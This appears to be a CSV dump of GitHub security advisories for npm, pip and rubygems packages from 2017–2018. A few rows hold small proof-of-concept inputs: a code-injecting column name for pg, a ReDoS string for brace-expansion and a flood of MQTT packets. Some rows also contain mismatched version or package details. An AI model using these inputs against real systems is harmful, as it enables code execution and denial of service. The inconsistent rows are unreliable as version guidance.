1468,19661,radiant,GHSA-gp82-xr77-88f4,CVE-2018-7261,https://github.com/advisories/GHSA-gp82-xr77-88f4,moderate,2018-07-27 17:08:29 UTC,Moderate severity vulnerability that affects radiant,"There are multiple Persistent XSS vulnerabilities in Radiant CMS 1.1.4. They affect Personal Preferences (Name and Username) and Configuration (Site Title, Dev Site Domain, Page Parts, and Page Fields).",rubygems
1469,16663,adm-zip,GHSA-3v6h-hqm4-2rg6,CVE-2018-1002204,https://github.com/advisories/GHSA-3v6h-hqm4-2rg6,high,2018-07-27 17:07:14 UTC,Arbitrary File Write in adm-zip,"Versions of `adm-zip` before 0.4.9 are vulnerable to arbitrary file write when used to extract a specifically crafted archive that contains path traversal filenames (`../../file.txt` for example).


## Recommendation

Update to version 0.4.9 or later.",npm
1470,18608,unzipper,GHSA-884w-698f-927f,CVE-2018-1002203,https://github.com/advisories/GHSA-884w-698f-927f,high,2018-07-27 17:06:50 UTC,Arbitrary File Write via Archive Extraction in unzipper,"Versions of `unzipper` before 0.8.13 are vulnerable to arbitrary file write when used to extract a specifically crafted archive that contains path traversal filenames (`../../file.txt` for example).


## Recommendation

Update to version 0.3.18 or later.",npm
1471,17334,https-proxy-agent,GHSA-8g7p-74h8-hg48,CVE-2018-3739,https://github.com/advisories/GHSA-8g7p-74h8-hg48,critical,2018-07-27 17:04:52 UTC,Denial of Service in https-proxy-agent,"Versions of `https-proxy-agent` before 2.2.0 are vulnerable to denial of service. This is due to unsanitized options (proxy.auth) being passed to `Buffer()`.


## Recommendation

Update to version 2.2.0 or later.",npm
1472,17417,jquery-ui,GHSA-g8q2-24jh-5hpc,,https://github.com/advisories/GHSA-g8q2-24jh-5hpc,high,2018-07-27 14:47:52 UTC,High severity vulnerability that affects jquery-ui,"Withdrawn, accidental duplicate publish.

Cross-site scripting (XSS) vulnerability in jQuery UI before 1.12.0 might allow remote attackers to inject arbitrary web script or HTML via the closeText parameter of the dialog function.",npm
1473,16197,pg,GHSA-wc9v-mj63-m9g5,CVE-2017-16082,https://github.com/advisories/GHSA-wc9v-mj63-m9g5,high,2018-07-24 19:44:42 UTC,Remote Code Execution in pg,"Affected versions of `pg` contain a remote code execution vulnerability that occurs when the remote database or query specifies a crafted column name. 

There are two specific scenarios in which it is likely for an application to be vulnerable:
1. The application executes unsafe, user-supplied sql which contains malicious column names.
2. The application connects to an untrusted database and executes a query returning results which contain a malicious column name.

## Proof of Concept
```
const { Client } = require('pg')
const client = new Client()
client.connect()

const sql = `SELECT 1 AS ""\\'/*"", 2 AS ""\\'*/\n + console.log(process.env)] = null;\n//""`

client.query(sql, (err, res) => {
  client.end()
})
```


## Recommendation

* Version 2.x.x: Update to version 2.11.2 or later.
* Version 3.x.x: Update to version 3.6.4 or later.
* Version 4.x.x: Update to version 4.5.7 or later.
* Version 5.x.x: Update to version 5.2.1 or later.
* Version 6.x.x: Update to version 6.4.2 or later. ( Note that versions 6.1.6, 6.2.5, and 6.3.3 are also patched. )
* Version 7.x.x: Update to version 7.1.2 or later. ( Note that version 7.0.2 is also patched. )",npm
1474,18037,fresh,GHSA-9qj9-36jm-prpv,CVE-2017-16119,https://github.com/advisories/GHSA-9qj9-36jm-prpv,high,2018-07-24 20:16:57 UTC,Regular Expression Denial of Service in fresh,"Affected versions of `fresh` are vulnerable to regular expression denial of service when parsing specially crafted user input.


## Recommendation

Update to version 0.5.2 or later.",npm
1475,16758,method-override,GHSA-qx2f-477c-35rq,CVE-2017-16136,https://github.com/advisories/GHSA-qx2f-477c-35rq,high,2018-07-24 20:06:04 UTC,method-override ReDoS when untrusted user input passed into X-HTTP-Method-Override header,"Affected versions of `method-override` are vulnerable to a regular expression denial of service vulnerability when untrusted user input is passed into the `X-HTTP-Method-Override` header.


## Recommendation

Update to version 2.3.10 or later",npm
1476,20276,Plone,GHSA-h6hq-c896-w882,CVE-2011-1949,https://github.com/advisories/GHSA-h6hq-c896-w882,low,2018-07-23 21:01:10 UTC,Low severity vulnerability that affects Plone,"Cross-site scripting (XSS) vulnerability in the safe_html filter in Products.PortalTransforms in Plone 2.1 through 4.1 allows remote authenticated users to inject arbitrary web script or HTML via unspecified vectors, a different vulnerability than CVE-2010-2422.",pip
1477,16343,electron,GHSA-4w88-rjj3-x7wp,CVE-2017-16151,https://github.com/advisories/GHSA-4w88-rjj3-x7wp,high,2018-07-24 20:04:23 UTC,Chromium Remote Code Execution in electron,"Affected versions of `ElectronJS` are susceptible to a remote code execution vulnerability that occurs when an affected application access remote content, even if the [sandbox option](https://electron.atom.io/docs/api/sandbox-option) is enabled.



## Recommendation

Update to electron version 1.7.8 or later.",npm
1478,19965,feedparser,GHSA-6h52-4vmh-8x4f,CVE-2011-1156,https://github.com/advisories/GHSA-6h52-4vmh-8x4f,moderate,2018-07-23 19:50:33 UTC,Moderate severity vulnerability that affects feedparser,feedparser.py in Universal Feed Parser (aka feedparser or python-feedparser) before 5.0.1 allows remote attackers to cause a denial of service (application crash) via a malformed DOCTYPE declaration.,pip
1479,19844,Pillow,GHSA-hvr8-466p-75rh,CVE-2016-4009,https://github.com/advisories/GHSA-hvr8-466p-75rh,critical,2018-07-24 20:15:48 UTC,Integer overflow discovered in Pillow,"Integer overflow in the ImagingResampleHorizontal function in libImaging/Resample.c in Pillow before 3.1.1 allows remote attackers to have unspecified impact via negative values of the new size, which triggers a heap-based buffer overflow.",pip
1480,28959,django-tastypie,GHSA-pvhp-v9qp-xf5r,CVE-2011-4103,https://github.com/advisories/GHSA-pvhp-v9qp-xf5r,high,2018-07-23 19:50:48 UTC,High severity vulnerability that affects django-piston and django-tastypie,"emitters.py in Django Piston before 0.2.3 and 0.2.x before 0.2.2.1 does not properly deserialize YAML data, which allows remote attackers to execute arbitrary Python code via vectors related to the yaml.load method.

Django Tastypie has a very similar vulnerability.",pip
1481,20276,Plone,GHSA-pcwm-8jc3-qxvj,CVE-2011-4462,https://github.com/advisories/GHSA-pcwm-8jc3-qxvj,moderate,2018-07-23 19:50:52 UTC,Moderate severity vulnerability that affects Plone,"Plone 4.1.3 and earlier computes hash values for form parameters without restricting the ability to trigger hash collisions predictably, which allows remote attackers to cause a denial of service (CPU consumption) by sending many crafted parameters.",pip
1482,30233,Zope2,GHSA-v7q8-wvvh-c97p,CVE-2010-1104,https://github.com/advisories/GHSA-v7q8-wvvh-c97p,moderate,2018-07-23 19:51:28 UTC,Moderate severity vulnerability that affects Zope2,"Cross-site scripting (XSS) vulnerability in Zope 2.8.x before 2.8.12, 2.9.x before 2.9.12, 2.10.x before 2.10.11, 2.11.x before 2.11.6, and 2.12.x before 2.12.3 allows remote attackers to inject arbitrary web script or HTML via vectors related to error messages.",pip
1483,19965,feedparser,GHSA-4m72-rmm9-2qjr,CVE-2011-1158,https://github.com/advisories/GHSA-4m72-rmm9-2qjr,moderate,2018-07-23 19:51:43 UTC,Moderate severity vulnerability that affects feedparser,"Cross-site scripting (XSS) vulnerability in feedparser.py in Universal Feed Parser (aka feedparser or python-feedparser) 5.x before 5.0.1 allows remote attackers to inject arbitrary web script or HTML via an unexpected URI scheme, as demonstrated by a javascript: URI.",pip
1484,19844,Pillow,GHSA-8xjv-v9xq-m5h9,CVE-2016-0775,https://github.com/advisories/GHSA-8xjv-v9xq-m5h9,moderate,2018-07-24 20:15:36 UTC,Moderate severity vulnerability that affects Pillow,Buffer overflow in the ImagingFliDecode function in libImaging/FliDecode.c in Pillow before 3.1.1 allows remote attackers to cause a denial of service (crash) via a crafted FLI file.,pip
1485,19844,Pillow,GHSA-3c5c-7235-994j,CVE-2016-2533,https://github.com/advisories/GHSA-3c5c-7235-994j,moderate,2018-07-24 20:15:13 UTC,Moderate severity vulnerability that affects Pillow,Buffer overflow in the ImagingPcdDecode function in PcdDecode.c in Pillow before 3.1.1 and Python Imaging Library (PIL) 1.1.7 and earlier allows remote attackers to cause a denial of service (crash) via a crafted PhotoCD file.,pip
1486,19844,Pillow,GHSA-rwr3-c2q8-gm56,CVE-2016-9189,https://github.com/advisories/GHSA-rwr3-c2q8-gm56,moderate,2018-07-24 20:08:27 UTC,Moderate severity vulnerability that affects Pillow,"Pillow before 3.3.2 allows context-dependent attackers to obtain sensitive information by using the ""crafted image file"" approach, related to an ""Integer Overflow"" issue affecting the Image.core.map_buffer in map.c component.",pip
1487,20276,Plone,GHSA-p6h9-hpcg-c6gm,CVE-2011-2528,https://github.com/advisories/GHSA-p6h9-hpcg-c6gm,high,2018-07-23 19:52:02 UTC,High severity vulnerability that affects Plone and Zope2,"Unspecified vulnerability in (1) Zope 2.12.x before 2.12.19 and 2.13.x before 2.13.8, as used in Plone 4.x and other products, and (2) PloneHotfix20110720 for Plone 3.x allows attackers to gain privileges via unspecified vectors, related to a ""highly serious vulnerability."" NOTE: this vulnerability exists because of an incorrect fix for CVE-2011-0720.",pip
1488,19844,Pillow,GHSA-hggx-3h72-49ww,CVE-2016-0740,https://github.com/advisories/GHSA-hggx-3h72-49ww,moderate,2018-07-24 20:03:51 UTC,Moderate severity vulnerability that affects Pillow,Buffer overflow in the ImagingLibTiffDecode function in libImaging/TiffDecode.c in Pillow before 3.1.1 allows remote attackers to overwrite memory via a crafted TIFF file.,pip
1489,19965,feedparser,GHSA-hjf3-r7gw-9rwg,CVE-2012-2921,https://github.com/advisories/GHSA-hjf3-r7gw-9rwg,moderate,2018-07-24 20:00:41 UTC,Moderate severity vulnerability that affects feedparser,Universal Feed Parser (aka feedparser or python-feedparser) before 5.1.2 allows remote attackers to cause a denial of service (memory consumption) via a crafted XML ENTITY declaration in a non-ASCII encoded document.,pip
1490,19965,feedparser,GHSA-2p78-8hh6-96xc,CVE-2011-1157,https://github.com/advisories/GHSA-2p78-8hh6-96xc,moderate,2018-07-23 19:52:21 UTC,Moderate severity vulnerability that affects feedparser,Cross-site scripting (XSS) vulnerability in feedparser.py in Universal Feed Parser (aka feedparser or python-feedparser) 5.x before 5.0.1 allows remote attackers to inject arbitrary web script or HTML via malformed XML comments.,pip
1491,20276,Plone,GHSA-2qx8-589j-gcpx,CVE-2011-1950,https://github.com/advisories/GHSA-2qx8-589j-gcpx,moderate,2018-07-23 20:26:45 UTC,Moderate severity vulnerability that affects Plone and plone.app.users,"plone.app.users in Plone 4.0 and 4.1 allows remote authenticated users to modify the properties of arbitrary accounts via unspecified vectors, as exploited in the wild in June 2011.",pip
1492,16484,serve,GHSA-686g-3xr3-x4x6,CVE-2018-3809,https://github.com/advisories/GHSA-686g-3xr3-x4x6,moderate,2018-07-18 18:33:15 UTC,Information Exposure on Case Insensitive File Systems in serve,"Versions of `serve` before 7.0.0 are vulnerable to information exposure, bypassing the ignore security control, but only on case insensitive file systems.



## Recommendation

Update to version 7.0.0 or later.",npm
1493,20776,pysaml2,GHSA-cq94-qf6q-mf2h,CVE-2017-1000246,https://github.com/advisories/GHSA-cq94-qf6q-mf2h,moderate,2018-07-16 16:50:30 UTC,Moderate severity vulnerability that affects pysaml2,"Python package pysaml2 version 4.5.0 and earlier reuses the initialization vector across encryptions in the IDP server, resulting in weak encryption of data.",pip
1494,20789,cfscrape,GHSA-5mc5-5j6c-qmf9,CVE-2017-7235,https://github.com/advisories/GHSA-5mc5-5j6c-qmf9,high,2018-07-13 16:01:01 UTC,High severity vulnerability that affects cfscrape,An issue was discovered in cloudflare-scrape 1.6.6 through 1.7.1. A malicious website owner could craft a page that executes arbitrary Python code against any cfscrape user who scrapes that website. This is fixed in 1.8.0.,pip
1495,20776,pysaml2,GHSA-924m-4pmx-c67h,CVE-2017-1000433,https://github.com/advisories/GHSA-924m-4pmx-c67h,high,2018-07-13 16:01:17 UTC,High severity vulnerability that affects pysaml2,pysaml2 version 4.4.0 and older accept any password when run with python optimizations enabled. This allows attackers to log in as any user without knowing their password.,pip
1496,20340,tablib,GHSA-gcr6-rf47-jrgf,CVE-2017-2810,https://github.com/advisories/GHSA-gcr6-rf47-jrgf,critical,2018-07-13 16:01:25 UTC,Loaded Databook of Tablib prone to python insertion resulting in command execution,An exploitable vulnerability exists in the Databook loading functionality of Tablib 0.11.4. A yaml loaded Databook can execute arbitrary python commands resulting in command execution. An attacker can insert python into loaded yaml to trigger this vulnerability.,pip
1497,29225,tlslite-ng,GHSA-cwh5-3cw7-4286,CVE-2018-1000159,https://github.com/advisories/GHSA-cwh5-3cw7-4286,moderate,2018-07-12 20:30:44 UTC,Moderate severity vulnerability that affects tlslite-ng,"tlslite-ng version 0.7.3 and earlier, since commit d7b288316bca7bcdd082e6ccff5491e241305233 contains a CWE-354: Improper Validation of Integrity Check Value vulnerability in TLS implementation, tlslite/utils/constanttime.py: ct_check_cbc_mac_and_pad(); line ""end_pos = data_len - 1 - mac.digest_size"" that can result in an attacker manipulating the TLS ciphertext which will not be detected by receiving tlslite-ng. This attack appears to be exploitable via man in the middle on a network connection. This vulnerability appears to have been fixed after commit 3674815d1b0f7484454995e2737a352e0a6a93d8.",pip
1498,19931,gunicorn,GHSA-32pc-xphx-q4f6,CVE-2018-1000164,https://github.com/advisories/GHSA-32pc-xphx-q4f6,high,2018-07-12 20:30:49 UTC,Gunicorn contains Improper Neutralization of CRLF sequences in HTTP headers,"gunicorn version 19.4.5 contains a CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers vulnerability in ""process_headers"" function in ""gunicorn/http/wsgi.py"" that can result in an attacker causing the server to return arbitrary HTTP headers. This vulnerability appears to have been fixed in 19.5.0.",pip
1499,18716,eslint-config-eslint,GHSA-hxxf-q3w9-4xgw,,https://github.com/advisories/GHSA-hxxf-q3w9-4xgw,critical,2018-07-12 19:52:02 UTC,Malicious Package in eslint-scope,"Version 3.7.2 of `eslint-scope` was published without authorization and was found to contain malicious code. This code would read the users `.npmrc` file and send any found authentication tokens to 2 remote servers.


## Recommendation

The best course of action if you found this package installed in your environment is to revoke all your npm tokens. You can find instructions on how to do that here. https://docs.npmjs.com/getting-started/working_with_tokens#how-to-revoke-tokens",npm
1500,19844,Pillow,GHSA-w4vg-rf63-f3j3,CVE-2016-9190,https://github.com/advisories/GHSA-w4vg-rf63-f3j3,high,2018-07-12 14:45:42 UTC,"Arbitrary code using ""crafted image file"" approach affecting Pillow","Pillow before 3.3.2 allows context-dependent attackers to execute arbitrary code by using the ""crafted image file"" approach, related to an ""Insecure Sign Extension"" issue affecting the ImagingNew in Storage.c component.",pip
1501,20024,notebook,GHSA-6cwv-x26c-w2q4,CVE-2018-8768,https://github.com/advisories/GHSA-6cwv-x26c-w2q4,high,2018-07-12 12:00:00 UTC,"Jupyter Notebook file bypasses sanitization, executes JavaScript","In Jupyter Notebook before 5.4.1, a maliciously forged notebook file can bypass sanitization to execute JavaScript in the notebook context. Specifically, invalid HTML is 'fixed' by jQuery after sanitization, making it dangerous.",pip
1502,18078,growl,GHSA-qh2h-chj9-jffq,CVE-2017-16042,https://github.com/advisories/GHSA-qh2h-chj9-jffq,critical,2018-06-08 12:43:43 UTC,Growl before 1.10.0 vulnerable to Command Injection,"Affected versions of `growl` do not properly sanitize input prior to passing it into a shell command, allowing for arbitrary command execution.


## Recommendation

Update to version 1.10.0 or later.",npm
1503,18841,sinatra,GHSA-mq35-wqvf-r23c,CVE-2018-11627,https://github.com/advisories/GHSA-mq35-wqvf-r23c,moderate,2018-06-05 21:32:06 UTC,Sinatra has XSS via 400 Bad Request page via params parser exception,Sinatra before 2.0.2 has XSS via the 400 Bad Request page that occurs upon a params parser exception.,rubygems
1504,17980,@ckeditor/ckeditor5-link,GHSA-gvpx-9459-w3mj,CVE-2018-11093,https://github.com/advisories/GHSA-gvpx-9459-w3mj,moderate,2018-05-23 20:37:46 UTC,Cross-Site Scripting in @ckeditor/ckeditor5-link,"Versions of `status-board` prior to 10.0.1 are vulnerable to Cross-Site Scripting. The `_createPreviewButton()` function fails to sanitize the `href` attribute of a created `<a>` tag. This may allow attackers to execute arbitrary JavaScript in a victim's browser.


## Recommendation

Upgrade to version 10.0.1 or later.",npm
1505,27604,rails-html-sanitizer,GHSA-px3r-jm9g-c8w8,CVE-2018-3741,https://github.com/advisories/GHSA-px3r-jm9g-c8w8,moderate,2018-04-26 15:41:10 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,"There is a possible XSS vulnerability in all rails-html-sanitizer gem versions below 1.0.4 for Ruby. The gem allows non-whitelisted attributes to be present in sanitized output when input with specially-crafted HTML fragments, and these attributes can lead to an XSS attack on target applications. This issue is similar to CVE-2018-8048 in Loofah. All users running an affected release should either upgrade or use one of the workarounds immediately.",rubygems
1506,18823,nokogiri,GHSA-882p-jqgm-f45g,CVE-2017-18258,https://github.com/advisories/GHSA-882p-jqgm-f45g,moderate,2018-04-13 16:17:46 UTC,Moderate severity vulnerability that affects nokogiri,"The xz_head function in xzlib.c in libxml2 before 2.9.6 allows remote attackers to cause a denial of service (memory consumption) via a crafted LZMA file, because the decoder functionality does not restrict memory usage to what is required for a legitimate file.",rubygems
1507,19170,bson,GHSA-h6rj-8r3c-9gpj,CVE-2015-4412,https://github.com/advisories/GHSA-h6rj-8r3c-9gpj,critical,2018-03-05 19:43:21 UTC,bson is vulnerable to denial of service due to incorrect regex validation,BSON injection vulnerability in the legal function in BSON (bson-ruby) gem before 3.0.4 for Ruby allows remote attackers to cause a denial of service (resource consumption) or inject arbitrary data via a crafted string.,rubygems
1508,19467,loofah,GHSA-x7rv-cr6v-4vm4,CVE-2018-8048,https://github.com/advisories/GHSA-x7rv-cr6v-4vm4,moderate,2018-03-21 11:57:11 UTC,Moderate severity vulnerability that affects loofah,"Loofah allows non-whitelisted attributes to be present in sanitized output when input with specially-crafted HTML fragments.

Users are affected if running Loofah < 2.2.1, but only:

* when running on MRI or RBX,
* in combination with libxml2 >= 2.9.2.

Please note: JRuby users are not affected.",rubygems
1509,19061,sanitize,GHSA-7f42-p84j-f58p,CVE-2018-3740,https://github.com/advisories/GHSA-7f42-p84j-f58p,high,2018-03-21 11:56:32 UTC,Sanitize vulnerable to Improper Input Validation and Cross-site Scripting,"When Sanitize <= 4.6.2 is used in combination with libxml2 >= 2.9.2, a specially crafted HTML fragment can cause libxml2 to generate improperly escaped output, allowing non-whitelisted attributes to be used on whitelisted elements.

This can allow HTML and JavaScript injection, which could result in XSS if Sanitize's output is served to browsers.",rubygems
1510,26832,doorkeeper,GHSA-hwhh-2fwm-cfgw,CVE-2018-1000088,https://github.com/advisories/GHSA-hwhh-2fwm-cfgw,moderate,2018-03-13 20:44:48 UTC,Doorkeeper is vulnerable to stored XSS and code execution,"Doorkeeper version 2.1.0 through 4.2.5 contains a Cross Site Scripting (XSS) vulnerability in web view's OAuth app form, user authorization prompt web view that can result in Stored XSS on the OAuth Client's name will cause users interacting with it will execute payload. This attack appear to be exploitable via The victim must be tricked to click an opaque link to the web view that runs the XSS payload. A malicious version virtually indistinguishable from a normal link. This vulnerability appears to have been fixed in 4.2.6, 4.3.0.",rubygems
1511,18938,http,GHSA-6wpv-cj6x-v3jw,CVE-2015-1828,https://github.com/advisories/GHSA-6wpv-cj6x-v3jw,moderate,2018-03-13 16:15:57 UTC,Moderate severity vulnerability that affects http,"The Ruby http gem before 0.7.3 does not verify hostnames in SSL connections, which might allow remote attackers to obtain sensitive information via a man-in-the-middle-attack.",rubygems
1512,19588,rack-protection,GHSA-688c-3x49-6rqj,CVE-2018-1000119,https://github.com/advisories/GHSA-688c-3x49-6rqj,moderate,2018-03-07 22:22:22 UTC,Moderate severity vulnerability that affects rack-protection,Sinatra rack-protection versions 1.5.4 and 2.0.0.rc3 and earlier contains a timing attack vulnerability in the CSRF token checking that can result in signatures can be exposed. This attack appear to be exploitable via network connectivity to the ruby application. This vulnerability appears to have been fixed in 1.5.5 and 2.0.0.,rubygems
1513,19336,rails_admin,GHSA-pxr8-w3jq-rcwj,CVE-2017-12098,https://github.com/advisories/GHSA-pxr8-w3jq-rcwj,moderate,2018-03-05 19:37:23 UTC,Moderate severity vulnerability that affects rails_admin,An exploitable cross site scripting (XSS) vulnerability exists in the add filter functionality of the rails_admin rails gem version 1.2.0. A specially crafted URL can cause an XSS flaw resulting in an attacker being able to execute arbitrary javascript on the victim's browser. An attacker can phish an authenticated user to trigger this vulnerability.,rubygems
1514,15847,moment,GHSA-446m-mv8f-q348,CVE-2017-18214,https://github.com/advisories/GHSA-446m-mv8f-q348,high,2018-03-05 18:35:09 UTC,Regular Expression Denial of Service in moment,"Affected versions of `moment` are vulnerable to a low severity regular expression denial of service when parsing dates as strings.


## Recommendation

Update to version 2.19.3 or later.",npm
1515,19163,ox,GHSA-wfwm-chj7-w59r,CVE-2017-16229,https://github.com/advisories/GHSA-wfwm-chj7-w59r,moderate,2018-03-05 18:29:32 UTC,Moderate severity vulnerability that affects ox,"In the Ox gem 2.8.1 for Ruby, the process crashes with a stack-based buffer over-read in the read_from_str function in sax_buf.c when a crafted input is supplied to sax_parse.",rubygems
1516,18841,sinatra,GHSA-h29f-7f56-j8wh,CVE-2018-7212,https://github.com/advisories/GHSA-h29f-7f56-j8wh,moderate,2018-02-20 19:23:20 UTC,Moderate severity vulnerability that affects sinatra,An issue was discovered in rack-protection/lib/rack/protection/path_traversal.rb in Sinatra 2.x before 2.0.1 on Windows. Path traversal is possible via backslash characters.,rubygems
1517,18985,paperclip,GHSA-5jcf-c5rg-rmm8,CVE-2017-0889,https://github.com/advisories/GHSA-5jcf-c5rg-rmm8,high,2018-01-22 13:31:34 UTC,High severity vulnerability that affects paperclip,Paperclip ruby gem version 3.1.4 and later suffers from a Server-SIde Request Forgery (SSRF) vulnerability in the Paperclip::UriAdapter class. Attackers may be able to access information about internal network resources.,rubygems
1518,15892,jquery,GHSA-mhpp-875w-9cpv,CVE-2016-10707,https://github.com/advisories/GHSA-mhpp-875w-9cpv,high,2018-01-22 13:32:42 UTC,Denial of Service in jquery,"Affected versions of `jquery` use a lowercasing logic on attribute names. When given a boolean attribute with a name that contains uppercase characters, `jquery` enters into an infinite recursion loop, exceeding the call stack limit, and resulting in a denial of service condition.


## Recommendation

Update to version 3.0.0 or later.",npm
1519,16863,next,GHSA-m34x-wgrh-g897,CVE-2018-6184,https://github.com/advisories/GHSA-m34x-wgrh-g897,high,2018-01-24 19:38:52 UTC,Directory traversal vulnerability in Next.js,Next.js 4 before 4.2.3 has Directory Traversal under the `/_next` request namespace.,npm
1520,16863,next,GHSA-3f5c-4qxj-vmpf,CVE-2017-16877,https://github.com/advisories/GHSA-3f5c-4qxj-vmpf,high,2017-12-05 02:04:14 UTC,High severity vulnerability that affects next,"ZEIT Next.js before 2.4.1 has directory traversal under the /_next and /static request namespace, allowing attackers to obtain sensitive information.",npm
1521,26819,cairo,GHSA-5v3f-73gv-x7x5,CVE-2017-7475,https://github.com/advisories/GHSA-5v3f-73gv-x7x5,moderate,2017-11-15 20:41:14 UTC,cairo is vulnerable to denial of service due to a null pointer dereference,Cairo version 1.15.4 is vulnerable to a NULL pointer dereference related to the FT_Load_Glyph and FT_Render_Glyph resulting in an application crash.,rubygems
1522,18603,brace-expansion,GHSA-832h-xg76-4gv6,CVE-2017-18077,https://github.com/advisories/GHSA-832h-xg76-4gv6,high,2018-01-29 15:50:46 UTC,ReDoS in brace-expansion,"Affected versions of `brace-expansion` are vulnerable to a regular expression denial of service condition.

## Proof of Concept

```
var expand = require('brace-expansion');
expand('{,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n}');
```


## Recommendation

Update to version 1.1.7 or later.",npm
1523,18914,omniauth,GHSA-9pr6-grf4-x2fr,CVE-2017-18076,https://github.com/advisories/GHSA-9pr6-grf4-x2fr,high,2018-01-29 15:45:28 UTC,Omniauth allows POST parameters to be stored in session,"In strategy.rb in OmniAuth before 1.3.2, the authenticity_token value is improperly protected because POST (in addition to GET) parameters are stored in the session and become available in the environment of the callback phase.",rubygems
1524,15892,jquery,GHSA-rmxg-73gg-4p98,CVE-2015-9251,https://github.com/advisories/GHSA-rmxg-73gg-4p98,moderate,2018-01-22 13:32:06 UTC,Cross-Site Scripting (XSS) in jquery,"Affected versions of `jquery` interpret `text/javascript` responses from cross-origin ajax requests, and automatically execute the contents in `jQuery.globalEval`, even when the ajax request doesn't contain the `dataType` option.


## Recommendation

Update to version 3.0.0 or later.",npm
1525,19661,radiant,GHSA-mvw8-v767-qhjm,CVE-2018-5216,https://github.com/advisories/GHSA-mvw8-v767-qhjm,moderate,2018-01-06 01:11:52 UTC,Moderate severity vulnerability that affects radiant,Radiant CMS 1.1.4 has XSS via crafted Markdown input in the part_body_content parameter to an admin/pages/*/edit resource.,rubygems
1526,19197,net-ldap,GHSA-m7p8-9w66-9frm,CVE-2017-17718,https://github.com/advisories/GHSA-m7p8-9w66-9frm,moderate,2018-01-06 01:11:34 UTC,Moderate severity vulnerability that affects net-ldap,The Net::LDAP (aka net-ldap) gem before 0.16.0 for Ruby has Missing SSL Certificate Validation.,rubygems
1527,16065,marked,GHSA-7px7-7xjx-hxm8,CVE-2017-1000427,https://github.com/advisories/GHSA-7px7-7xjx-hxm8,moderate,2018-01-04 21:04:19 UTC,Moderate severity vulnerability that affects marked,marked version 0.3.6 and earlier is vulnerable to an XSS attack in the data: URI parser.,npm
1528,16065,marked,GHSA-crmx-v835-hcp4,CVE-2017-17461,https://github.com/advisories/GHSA-crmx-v835-hcp4,moderate,2018-01-04 21:04:09 UTC,Moderate severity vulnerability that affects marked,"# Withdrawn

This advisory has been withdrawn, per NVD: [""This candidate was withdrawn by its CNA. Further investigation showed that it was not a security issue.""](https://nvd.nist.gov/vuln/detail/CVE-2017-17461)

# Original Description

A Regular expression Denial of Service (ReDoS) vulnerability in the file marked.js of the marked npm package (tested on version 0.3.7) allows a remote attacker to overload and crash a server by passing a maliciously crafted string.",npm
1529,16714,mqtt,GHSA-h9mj-fghc-664w,CVE-2017-10910,https://github.com/advisories/GHSA-h9mj-fghc-664w,moderate,2017-12-28 22:51:58 UTC,Denial of Service in mqtt,"Affected versions of `mqtt` do not properly handle PUBLISH packets returning from the server, leading to a Denial of Service condition.

The vulnerability is completely mitigated if the only connected servers are trusted, guaranteed not to be under the control of a malicious actor.

## Proof of Concept

The following is a demonstration of how to generate the malicious packet sequence, but does not include information on handling the initial network connections and MQTT overhead.
```
var mqttp = require('mqtt-packet');
var packets = [];
for(var i=0; i<=1000;i++){
    packets.push(
        mqttp.generate({
            cmd:'publish',
            topic:Buffer.from('hello'),
            payload:Buffer.from('world'),
            retain: false,
            dup: false, 
            messageId: ++i, 
            qos: 1
        })
    )
}

```


## Recommendation

Update to version 2.15.0 or later.",npm
1530,17429,ecstatic,GHSA-pm9p-9926-w68m,CVE-2016-10703,https://github.com/advisories/GHSA-pm9p-9926-w68m,high,2017-12-28 22:52:47 UTC,Denial of Service in ecstatic,"`ecstatic`, a simple static file server middleware, is vulnerable to denial of service. If a payload with a large number of null bytes (`%00`) is provided by an attacker it can crash ecstatic by running it out of memory.


[Results from the original advisory](https://www.checkmarx.com/advisories/denial-of-service-dos-vulnerability-in-ecstatic-npm-package/)

```
A payload of 22kB caused a lag of 1 second,
A payload of 35kB caused a lag of 3 seconds,
A payload of 86kB caused the server to crash
```


## Recommendation

Update to version 2.0.0 or later.",npm
1531,18825,yard,GHSA-gj4p-3wh3-2rmf,CVE-2017-17042,https://github.com/advisories/GHSA-gj4p-3wh3-2rmf,high,2017-12-21 00:47:25 UTC,High severity vulnerability that affects yard,"lib/yard/core_ext/file.rb in the server in YARD before 0.9.11 does not block relative paths with an initial ../ sequence, which allows attackers to conduct directory traversal attacks and read arbitrary files.",rubygems
1532,17138,mathjs,GHSA-pv8x-p9hq-j328,CVE-2017-1001003,https://github.com/advisories/GHSA-pv8x-p9hq-j328,critical,2017-12-18 22:27:53 UTC,Arbitrary Code Execution in mathjs,"math.js before 3.17.0 had an issue where private properties such as a constructor could be replaced by using unicode characters when creating an object.


## Recommendation

Upgrade to version 3.17.0 or later.",npm
1533,17138,mathjs,GHSA-vx5c-87qx-cv6c,CVE-2017-1001002,https://github.com/advisories/GHSA-vx5c-87qx-cv6c,critical,2017-12-18 22:27:45 UTC,Arbitrary Code Execution in mathjs,"math.js before 3.17.0 had an arbitrary code execution in the JavaScript engine. Creating a typed function with JavaScript code in the name could result arbitrary execution.


## Recommendation

Update to version 3.17.0 or later.",npm
1534,18823,nokogiri,GHSA-8c56-cpmw-89x7,CVE-2017-9050,https://github.com/advisories/GHSA-8c56-cpmw-89x7,high,2017-12-13 21:38:24 UTC,Out-of-bounds read in nokogiri,"libxml2 20904-GITv2.9.4-16-g0741801 is vulnerable to a heap-based buffer over-read in the xmlDictAddString function in dict.c. This vulnerability causes programs that use libxml2, such as PHP, to crash. This vulnerability exists because of an incomplete fix for CVE-2016-1839.  GitHub is notifying on nokogiri as uses libxml2.",rubygems
1535,27329,redis-store,GHSA-2w67-526p-gm73,CVE-2017-1000248,https://github.com/advisories/GHSA-2w67-526p-gm73,critical,2017-12-06 16:41:25 UTC,redis-store deserializes untrusted data the affected version range and description should be adjust to match as well,Redis-store <=v1.3.0 allows unsafe objects to be loaded from redis,rubygems
1536,16045,ejs,GHSA-3w5v-p54c-f74x,CVE-2017-1000228,https://github.com/advisories/GHSA-3w5v-p54c-f74x,critical,2017-11-30 23:15:19 UTC,ejs is vulnerable to remote code execution due to weak input validation,nodejs ejs versions older than 2.5.3 is vulnerable to remote code execution due to weak input validation in ejs.renderFile() function,npm
